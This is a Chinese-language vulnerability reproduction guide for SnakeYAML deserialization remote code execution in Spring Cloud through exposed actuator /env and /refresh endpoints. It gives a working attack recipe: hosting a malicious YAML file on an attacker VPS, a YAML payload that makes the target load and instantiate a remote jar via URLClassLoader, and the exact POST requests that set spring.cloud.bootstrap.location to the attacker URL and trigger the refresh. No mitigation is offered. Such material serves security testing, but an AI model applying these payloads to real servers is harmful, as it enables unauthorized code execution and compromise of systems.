<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>Spring Cloud SnakeYAML RCE</h1><h2>一、漏洞简介</h2><h4><em>利用条件：</em></h4><ul><li>可以 POST 请求目标网站的 /env 接口设置属性</li><li>可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖）</li><li>目标依赖的 spring-cloud-starter 版本 &lt; 1.3.0.RELEASE</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li></ul><h2>二、漏洞影响</h2><h2>三、复现过程</h2><h4><em>漏洞分析：</em></h4><ol class="pydocx-list-style-type-decimal"><li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址</li><li>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li><li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作</li><li>先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li><li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化</li><li>实例化类时执行恶意代码，造成 RCE 漏洞</li></ol><h3>漏洞复现</h3><h5>步骤一： 托管 yml 和 jar 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><p># 使用 python 快速开启 http server<br /><br />python2 -m SimpleHTTPServer 80<br />python3 -m http.server 80</p><p>在网站根目录下放置后缀为 yml 的文件 example.yml，内容如下：</p><p>!!javax.script.ScriptEngineManager [<br />  !!java.net.URLClassLoader [[<br />    !!java.net.URL ["http://your-vps-ip/example.jar"]<br />  ]]<br />]</p><p>在网站根目录下放置后缀为 jar 的文件 example.jar，内容是要执行的代码，代码编写及编译方式参考 yaml-payload</p><p>https://github.com/artsploit/yaml-payload</p><h5>步骤二： 设置 spring.cloud.bootstrap.location 属性</h5><p>spring 1.x</p><p>POST /env<br />Content-Type: application/x-www-form-urlencoded<br /><br />spring.cloud.bootstrap.location=http://your-vps-ip/example.yml</p><p>spring 2.x</p><p>POST /actuator/env<br />Content-Type: application/json<br /><br />{"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/example.yml"}</p><h5>步骤三： 刷新配置</h5><p>spring 1.x</p><p>POST /refresh<br />Content-Type: application/x-www-form-urlencoded</p><p>spring 2.x</p><p>POST /actuator/refresh<br />Content-Type: application/json</p></body></html>